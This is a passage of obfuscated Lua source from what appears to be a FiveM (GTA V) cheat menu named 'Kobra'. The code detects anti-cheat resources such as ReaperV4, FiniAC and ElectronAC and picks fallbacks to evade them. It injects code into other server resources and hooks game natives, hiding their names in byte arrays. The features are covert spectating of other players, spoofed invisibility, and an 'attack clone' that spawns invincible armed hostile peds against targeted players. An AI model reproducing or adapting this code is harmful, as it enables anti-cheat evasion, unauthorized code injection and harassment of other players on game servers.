            ]],v213,v325));v214=v214 + (2 -1) ;end end v210:Notify("success","Kobra",string.format("Object '%s' spawned on %d/%d player(s)!",v212,v214, #v211),6405 -(851 + 554) );end;v12.HandleSpectateToggle=function(v215,v216,v217) if  not v216 then local v522=0;while true do if (v522==0) then v215:Notify("error","Kobra","Invalid player ID provided!",2653 + 347 );return;end end end local v218=tonumber(v216);if  not v218 then v215:Notify("error","Kobra","Invalid server ID format!",8320 -5320 );return;end if (v218==tonumber(GetPlayerServerId(PlayerId()))) then local v523=0 -0 ;while true do if ((302 -(115 + 187))==v523) then v215:Notify("error","Kobra","You cannot spectate yourself!",2298 + 702 );return;end end end if v217 then v215:Notify("success","Kobra",("You have started spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v218)) or "Unknown" ,v218),3000);else v215:Notify("error","Kobra",("You have stopped spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(v218)) or "Unknown" ,v218),2841 + 159 );end local v219=GetResourceState("ReaperV4")=="started" ;if v219 then print("Spectate Fallback #3 (ReaperV4 detected, running direct)");if  not GetPlayerName(GetPlayerFromServerId(v218)) then v215:Notify("error","Kobra","Target player not found!",3000);print("[ReaperV4 Spectate] Error: No player found for server ID:",v218);return;end local v524=string.format([[
            local function HookNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    print("[ReaperV4 Spectate] Warning: Native " .. nativeName .. " not found or not a function")
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                if not f then print("[ReaperV4 Spectate] Error: Global function " .. k .. " not found") end
                return f
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            local function _t()
                local createThread = _G[_d(_b("CreateThread"))]
                if not createThread then print("[ReaperV4 Spectate] Error: CreateThread not found") end
                return createThread
            end
            HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
            HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
            HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            local function findClientIdByServerId(sid)
                local players = _g(_b("GetActivePlayers"))()
                if not players then
                    print("[ReaperV4 Spectate] Error: GetActivePlayers returned nil")
                    return -1
                end
                print("[ReaperV4 Spectate] Active players:", table.concat(players, ", "))
                for _, pid in ipairs(players) do
                    local serverId = _g(_b("GetPlayerServerId"))(pid)
                    print("[ReaperV4 Spectate] Player Client ID:", pid, "Server ID:", serverId)
                    if serverId == sid then
                        print("[ReaperV4 Spectate] Found client ID:", pid, "for server ID:", sid)
                        return pid
                    end
                end
                print("[ReaperV4 Spectate] Error: No client ID found for server ID:", sid)
                return -1
            end
            local function stopSpectate()
                if not _G.osintSpectate or not _G.osintSpectate.enabled then
                    print("[ReaperV4 Spectate] StopSpectate: Not currently spectating")
                    return
                end
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local back = _G.osintSpectate.back
                local heading = _G.osintSpectate.heading
                local wasVisible = _G.osintSpectate.wasVisible
                if back then
                    _g(_b("RequestCollisionAtCoord"))(back.x, back.y, back.z)
                end
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                end
                _g(_b("FreezeEntityPosition"))(me, false)
                if back then
                    _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true)
                end
                if heading then
                    _g(_b("SetEntityHeading"))(me, heading)
                end
                _g(_b("SetEntityCollision"))(me, true, true)
                _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                _g(_b("SetEntityInvincible"))(me, false)
                _G.osintSpectate.enabled = false
                _G.osintSpectate.targetSid = nil
                print("[ReaperV4 Spectate] Stopped spectating")
            end
            local function startSpectate(targetSid)
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local myCoords = _g(_b("GetEntityCoords"))(me)
                if not myCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil")
                    return
                end
                local myHeading = _g(_b("GetEntityHeading"))(me)
                if not _G.osintSpectate then _G.osintSpectate = {} end
                _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                _G.osintSpectate.heading = myHeading
                _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                _G.osintSpectate.enabled = true
                _G.osintSpectate.targetSid = targetSid
                local clientId = findClientIdByServerId(targetSid)
                local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                if clientId == -1 or targetPed == 0 then
                    print("[ReaperV4 Spectate] Error: Invalid client ID or target ped not found for server ID:", targetSid)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Target player not found!", 3000)
                    return
                end
                local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                if not tCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords for target ped returned nil")
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Failed to get target position!", 3000)
                    return
                end
                _g(_b("RequestCollisionAtCoord"))(tCoords.x, tCoords.y, tCoords.z)
                _g(_b("SetEntityVisible"))(me, false, false)
                _g(_b("SetEntityCollision"))(me, false, false)
                _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                _g(_b("SetEntityInvincible"))(me, true)
                local zOffset = 15.0 -- Default offset since GetGroundZFor_3dCoord is unavailable
                _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z + zOffset, false, false, false, true)
                _w(300)
                _g(_b("FreezeEntityPosition"))(me, true)
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('Kobra:Notify', "error", "Kobra", "Spectator mode not supported!", 3000)
                    return
                end
                print("[ReaperV4 Spectate] Started spectating server ID:", targetSid, "on ped:", targetPed)
                _t()(function()
                    while _G.osintSpectate and _G.osintSpectate.enabled do
                        local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                        if cid == -1 then
                            print("[ReaperV4 Spectate] Error: Client ID not found in loop for server ID:", targetSid)
                            break
                        end
                        local ped = _g(_b("GetPlayerPed"))(cid)
                        if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then
                            print("[ReaperV4 Spectate] Error: Target ped not found or does not exist")
                            break
                        end
                        local pc = _g(_b("GetEntityCoords"))(ped)
                        if not pc then
                            print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil in loop")
                            break
                        end
                        _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z + zOffset, false, false, false, true)
                        _w(400)
                    end
                    stopSpectate()
                end)
            end
            local enable = %s
            local sid = %d
            if enable then
                print("[ReaperV4 Spectate] Starting spectate for server ID:", sid)
                startSpectate(sid)
            else
                print("[ReaperV4 Spectate] Stopping spectate")
                stopSpectate()
            end
        ]],tostring(v217),v218);local v525,v526=load(v524);if v525 then local v682,v683=pcall(v525);if  not v682 then print("[ReaperV4 Spectate] Execution error:",v683);v215:Notify("error","Kobra","Failed to execute spectate code!",11822 -8822 );else print("[ReaperV4 Spectate] Code executed successfully");end else local v684=0;while true do if (v684==(1161 -(160 + 1001))) then print("[ReaperV4 Spectate] Load error:",v526);v215:Notify("error","Kobra","Failed to load spectate code!",2625 + 375 );break;end end end elseif ((GetResourceState("FiniAC")=="started") or (GetResourceState("ElectronAC")=="started")) then print("Spectate Fallback #1");MachoInjectResourceRaw("any",string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                HookNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                local function Clamp(val, min, max)
                    if val < min then return min end
                    if val > max then return max end
                    return val
                end
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if _G.osintSpectate.camera then
                        _g(_b("RenderScriptCams"))(false, false, 0, true, true)
                        _g(_b("DestroyCam"))(_G.osintSpectate.camera, false)
                        _G.osintSpectate.camera = nil
                    end
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then
                        local valid, groundZ = _g(_b("GetGroundZFor_3dCoord"))(back.x, back.y, back.z, false)
                        local targetCoords = valid and vector3(back.x, back.y, groundZ + 1.0) or back
                        _g(_b("SetEntityCoords"))(me, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
                    end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                    _g(_b("SetFocusEntity"))(me)
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local zOffset = 3.0
                    local cam = _g(_b("CreateCam"))("DEFAULT_SCRIPTED_CAMERA", true)
                    _G.osintSpectate.camera = cam
                    _g(_b("SetCamCoord"))(cam, tCoords.x, tCoords.y, tCoords.z + zOffset)
                    _g(_b("SetCamRot"))(cam, -30.0, 0.0, _g(_b("GetEntityHeading"))(targetPed), 2)
                    _g(_b("RenderScriptCams"))(true, false, 0, true, true)
                    _t()(function()
                        local cameraReady = false
                        _w(550)
                        cameraReady = true
                        while _G.osintSpectate and _G.osintSpectate.enabled and cameraReady do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            _g(_b("SetCamCoord"))(cam, pc.x, pc.y, pc.z + zOffset)
                            local camRot = _g(_b("GetCamRot"))(cam, 2)
                            local x = _g(_b("GetDisabledControlNormal"))(0, 1)
                            local y = _g(_b("GetDisabledControlNormal"))(0, 2)
                            local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                            local newYaw = camRot.z - x * 5
                            _g(_b("SetCamRot"))(cam, newPitch, camRot.y, newYaw, 2)
                            _g(_b("SetFocusPosAndVel"))(pc.x, pc.y, pc.z, 0.0, 0.0, 0.0)
                            _w(0)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]],tostring(v217),v218));else print("Spectate Fallback #2");MachoInjectResourceRaw("monitor",string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true) end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local groundZ = tCoords.z
                    local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(tCoords.x, tCoords.y, tCoords.z, false)
                    if foundGround then
                        groundZ = zPos
                    end
                    local zOffset = math.max(15.0, tCoords.z - groundZ + 5.0)
                    _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z - zOffset, false, false, false, true)
                    _w(300)
                    _g(_b("FreezeEntityPosition"))(me, true)
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                    _t()(function()
                        while _G.osintSpectate and _G.osintSpectate.enabled do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            local groundZ = pc.z
                            local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(pc.x, pc.y, pc.z, false)
                            if foundGround then
                                groundZ = zPos
                            end
                            local zOffset = math.max(15.0, pc.z - groundZ + 5.0)
                            _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z - zOffset, false, false, false, true)
                            _w(400)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]],tostring(v217),v218));end end;local v74={"envi-medic","envi-hud","envi-yoga","envi-chopshop","envi-chopshop-v2","envi-foodtrucks","envi-dumpsters","envi-prescriptions","envi-druglabs","lation_laundering"};local function v75() for v326,v327 in ipairs(v74) do if (GetResourceState(v327)=="started") then return v327;end end return nil;end local v76=nil;if ((GetResourceState("es_extended")=="started") and (GetResourceState("timeless-emotes")=="started")) then v76="es_extended";elseif ((GetResourceState("core")=="started") and (GetResourceState("timeless-emotes")=="started")) then v76="core";end v12.EnableInvisibility=function(v220) local v221=0;local v222;while true do if (v221==1) then v222("CreateThread",function(v685,...) return v685(...);end);v222("PlayerPedId",function(v686,...) return v686(...);end);v221=1 + 1 ;end if (v221==2) then v222("IsEntityVisible",function(v687,...) return true;end);v222("IsEntityVisibleToScript",function(v688,...) return true;end);v221=6 -3 ;end if (0==v221) then v222=nil;function v222(v689,v690) local v691=0 -0 ;local v692;while true do if (v691==(1 + 0)) then _G[v689]=function(...) return v690(v692,...);end;break;end if (v691==(0 -0)) then v692=_G[v689];if ( not v692 or (type(v692)~="function")) then return;end v691=1 -0 ;end end end v221=720 -(316 + 403) ;end if (4==v221) then if  not _G.osintInvisibility.enabled then _G.osintInvisibility.enabled=true;local v780=PlayerPedId();_G.osintInvisibility.wasVisible=IsEntityVisible(v780);SetEntityVisible(v780,false,false);CreateThread(function() while _G.osintInvisibility and _G.osintInvisibility.enabled  do local v937=PlayerPedId();if (v937 and DoesEntityExist(v937)) then SetEntityVisible(v937,false,false);end Wait(500);end end);end break;end if (v221==(2 + 1)) then v222("SetEntityVisible",function(v693,v694,v695,v696) if (_G.osintInvisibility and _G.osintInvisibility.enabled) then return v693(v694,false,v696);end return v693(v694,v695,v696);end);if  not _G.osintInvisibility then _G.osintInvisibility={enabled=false,wasVisible=true};end v221=10 -6 ;end end end;v12.DisableInvisibility=function(v223) if (_G.osintInvisibility and _G.osintInvisibility.enabled) then local v527=0;local v528;while true do if (v527==(1 + 0)) then if (v528 and DoesEntityExist(v528)) then SetEntityVisible(v528,_G.osintInvisibility.wasVisible,false);end break;end if (v527==(0 -0)) then _G.osintInvisibility.enabled=false;v528=PlayerPedId();v527=1 + 0 ;end end end end;v12.HandleAttackClonePlayer=function(v224,v225) if ( not v225 or ( #v225==(0 + 0))) then return;end local v226=table.concat(v225,",");MachoHookNative(2596915000000000000 -0 ,function(v328) return true,v328;end);MachoHookNative(15321135000000000000,function(v329,v330,v331,v332,v333,v334,v335) return true,v329,v330,v331,v332,v333,v334,v335;end);MachoInjectResourceRaw("monitor",string.format([[
        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end
        local function g(n)
            return _G[decode(n)]
        end
        local function wait(n)
            return Citizen.Wait(n)
        end
        local function findClientIdByServerId(sid)
            local players = g({71,101,116,65,99,116,105,118,101,80,108,97,121,101,114,115})()
            for _, pid in ipairs(players) do
                if g({71,101,116,80,108,97,121,101,114,83,101,114,118,101,114,73,100})(pid) == sid then
                    return pid
                end
            end
            return nil
        end
        local function copyPedAppearance(sourcePed, targetPed)
            for i = 0, 11 do
                local drawable = g({71,101,116,80,101,100,68,114,97,119,97,98,108,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                local texture = g({71,101,116,80,101,100,84,101,120,116,117,114,101,86,97,114,105,97,116,105,111,110})(sourcePed, i)
                g({83,101,116,80,101,100,67,111,109,112,111,110,101,110,116,86,97,114,105,97,116,105,111,110})(targetPed, i, drawable, texture, 2)
            end
            for i = 0, 7 do
                local propIndex = g({71,101,116,80,101,100,80,114,111,112,73,110,100,101,120})(sourcePed, i)
                local propTexture = g({71,101,116,80,101,100,80,114,111,112,84,101,120,116,117,114,101,73,110,100,101,120})(sourcePed, i)
                if propIndex ~= -1 then
                    g({83,101,116,80,101,100,80,114,111,112})(targetPed, i, propIndex, propTexture)
                else
                    g({67,108,101,97,114,80,101,100,80,114,111,112})(targetPed, i)
                end
            end
            local headBlendData = {g({71,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(sourcePed)}
            if headBlendData[1] then
                g({83,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})(
                    targetPed,
                    headBlendData[2], -- shapeFirst
                    headBlendData[3], -- shapeSecond
                    headBlendData[4], -- shapeThird
                    headBlendData[5], -- skinFirst
                    headBlendData[6], -- skinSecond
                    headBlendData[7], -- skinThird
                    headBlendData[8], -- shapeMix
                    headBlendData[9], -- skinMix
                    headBlendData[10] -- thirdMix
                )
            end
        end
        local function clonePed(ped)
            local coords = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(ped)
            local heading = g({71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103})(ped)
            local modelHash = g({71,101,116,69,110,116,105,116,121,77,111,100,101,108})(ped)
            g({82,101,113,117,101,115,116,77,111,100,101,108})(modelHash)
            local timeout = 0
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) and timeout < 500 do
                wait(10)
                timeout = timeout + 1
            end
            if not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(modelHash) then return end
            -- Spawn ped 2 units away from player
            local spawnRadius = 2.0
            local spawnX = coords.x + (math.random() * 2 - 1) * spawnRadius
            local spawnY = coords.y + (math.random() * 2 - 1) * spawnRadius
            local spawnZ = coords.z
            local clone = g({67,114,101,97,116,101,80,101,100})(4, modelHash, spawnX, spawnY, spawnZ, heading, true, true)
            if clone and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(clone) then
                copyPedAppearance(ped, clone)
                g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(clone, true, true)
                g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})(modelHash)
                local cloneGroup = g({65,100,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112})("HOSTILE_CLONE_" .. tostring(clone))
                g({83,101,116,80,101,100,82,101,108,97,116,105,111,110,115,104,105,112,71,114,111,117,112,72,97,115,104})(clone, cloneGroup)
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, cloneGroup, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"))
                g({83,101,116,82,101,108,97,116,105,111,110,115,104,105,112,66,101,116,119,101,101,110,71,114,111,117,112,115})(5, g({71,101,116,72,97,115,104,75,101,121})("PLAYER"), cloneGroup)
                
                local weaponHash = g({71,101,116,72,97,115,104,75,101,121})(decode({87,69,65,80,79,78,95,83,84,85,78,71,85,78}))
                g({71,105,118,101,87,101,97,112,111,110,84,111,80,101,100})(clone, weaponHash, 1000, false, true)
                local weaponEntity = g({71,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110,69,110,116,105,116,121,73,110,100,101,120})(clone)
                if weaponEntity and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(weaponEntity) then
                    g({83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121})(weaponEntity, true, true)
                end
                g({83,101,116,80,101,100,68,114,111,112,115,87,101,97,112,111,110,115,87,104,101,110,68,101,97,100})(clone, false)
                g({83,101,116,80,101,100,67,97,110,83,119,105,116,99,104,87,101,97,112,111,110})(clone, false)
                g({84,97,115,107,67,111,109,98,97,116,80,101,100})(clone, ped, 0, 16)
                g({83,101,116,80,101,100,67,111,109,98,97,116,65,116,116,114,105,98,117,116,101,115})(clone, 0, true) -- Always aggressive
                g({83,101,116,80,101,100,70,108,101,101,65,116,116,114,105,98,117,116,101,115})(clone, 0, false) -- Prevent fleeing
                g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(clone, true)
                g({83,101,116,80,101,100,67,97,110,82,97,103,100,111,108,108})(clone, false)
            end
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                clonePed(ped)
            end
        end
